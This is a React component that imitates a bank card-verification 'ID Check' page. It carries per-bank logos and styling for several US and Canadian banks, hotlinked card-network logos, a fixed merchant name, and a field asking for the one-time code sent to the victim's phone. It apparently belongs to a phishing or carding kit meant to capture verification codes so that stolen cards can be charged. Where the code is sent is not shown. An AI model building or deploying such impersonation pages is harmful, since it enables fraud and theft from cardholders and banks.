import React from 'react';
import { CreditCard } from 'lucide-react';
import { banks as americanBanks, canadianbanks } from '../data'; // ✅ import both

interface TwoFactorCodeProps {
  code: string;
  setCode: (v: string) => void;
  onSubmit: (e: React.FormEvent) => void;
  disabled?: boolean;
  selectedBank: string;
  cardType: string;
  cardNumber: string;
  total: number;
  phoneNumber: string;
}

const sanitize = (v: string) => v.replace(/\D/g, ''); // only removes non-digits

const TwoFactorCode: React.FC<TwoFactorCodeProps> = ({
  code,
  setCode,
  onSubmit,
  disabled,
  selectedBank,
  cardType,
  cardNumber,
  total,
  phoneNumber,
}) => {
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCode(sanitize(e.target.value));
  };

  // ✅ Merge US + Canadian banks
  const allBanks = [...americanBanks, ...canadianbanks];
  const bankData = allBanks.find((bnk) => bnk.name === selectedBank);

  const lastFour = cardNumber.replace(/\s+/g, '').slice(-4);

  const getCardIcon = (type: string) => {
    const iconClass = 'w-28 object-contain';
    switch (type) {
      case 'visa':
        return (
          <div className={`${iconClass} flex items-center`}>
            <img
              src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
              className="w-[80px] h-[20px]"
            />
          </div>
        );
      case 'mastercard':
        return (
          <div className={`${iconClass} flex items-center`}>
            <img src="/bank-logos/mc-logo.svg" alt="Mastercard" />
          </div>
        );
      case 'amex':
        return (
          <div className={`${iconClass} flex items-center`}>
            <img
              src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg"
              alt="Amex"
            />
          </div>
        );
      case 'discover':
        return (
          <div className={`${iconClass} flex items-center bg-orange-500 text-white`}>
            DISC
          </div>
        );
      case 'jcb':
        return (
          <div className={`${iconClass} flex items-center`}>
            <img src="/bank-logos/jcb_emblem.svg" alt="JCB" />
          </div>
        );
      case 'diners':
        return (
          <div className={`${iconClass} flex items-center bg-gray-600 text-white`}>
            DC
          </div>
        );
      default:
        return <CreditCard className="w-6 h-6 text-gray-400" />;
    }
  };

  const className =
    selectedBank === 'Wells Fargo'
      ? 'bg-[#D61F28]'
      : selectedBank === 'Citi'
      ? 'w-[100px] h-[60px]'
      : selectedBank === 'PNC'
      ? 'bg-[#414E58]'
      : selectedBank === 'TD Bank'
      ? '!w-[150px] h-[50px]'
      : selectedBank === 'Truist'
      ? 'w-[150px] h-[50px]'
      : selectedBank === 'Regions Bank'
      ? 'w-[150px] h-[50px]'
      : selectedBank === 'M&T Bank'
      ? 'bg-[#015840]'
      : selectedBank === 'Navy Federal Credit Union'
      ? 'w-[200px] h-auto'
      : selectedBank === 'Royal Bank of Canada'
      ? 'bg-[#002D72]'
      : '';

  return (
    <div className="bg-white min-h-screen">
      {/* Header with bank logo and card type */}
      <div className="flex items-center justify-between p-4">
        <div className="border-b border-gray-200 flex justify-between w-full items-center">
          {bankData?.additionalLogo && (
            <img
              src={bankData.additionalLogo}
              alt={selectedBank}
              className={`${className} h-5 max-w-[200px] mb-2`}
            />
          )}
          <div className="flex items-center space-x-2 mb-2">
            {getCardIcon(cardType)} |
            <span className="text-sm font-medium text-gray-700">ID Check</span>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="p-6">
        <h1 className="text-2xl font-bold text-gray-900 mb-4">
          Submit the code we sent to you
        </h1>

        <p className="text-gray-600 mb-8">
          Enter the temporary code we sent to {phoneNumber}.
        </p>

        {/* Transaction Details */}
        <div className="space-y-4 mb-8">
          <div>
            <span className="font-semibold text-gray-900">Merchant:</span>
            <div className="text-gray-600 mt-1">pokéboostvault.com</div>
          </div>

          <div>
            <span className="font-semibold text-gray-900">Purchase Amount:</span>
            <div className="text-gray-900 font-semibold mt-1">
              ${total.toFixed(2)} USD
            </div>
          </div>

          <div>
            <span className="font-semibold text-gray-900">Card Number:</span>
            <div className="text-gray-600 mt-1">{cardNumber}</div>
          </div>
        </div>

        {/* Code Input Form */}
        <form onSubmit={onSubmit} className="space-y-6">
          <div>
            <label className="block text-sm font-semibold text-gray-900 mb-3">
              Code
            </label>
            <input
              type="text"
              value={code}
              onChange={handleChange}
              placeholder=""
              className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none text-lg text-center tracking-widest font-mono"
              required
            />
          </div>

          <button
            type="submit"
            disabled={disabled}
            className="w-full font-semibold py-3 px-6 rounded-lg transition-all duration-200 bg-blue-600 hover:bg-blue-700 text-white cursor-pointer disabled:opacity-50"
          >
            Submit Code
          </button>
        </form>

        {/* Resend Code Link */}
        <div className="text-center mt-6">
          <span className="text-gray-600">Didn't receive a code? </span>
          <button
            type="button"
            className="text-blue-600 hover:text-blue-800 font-medium transition-colors"
          >
            Resend code
          </button>
        </div>
      </div>
    </div>
  );
};

export default TwoFactorCode;
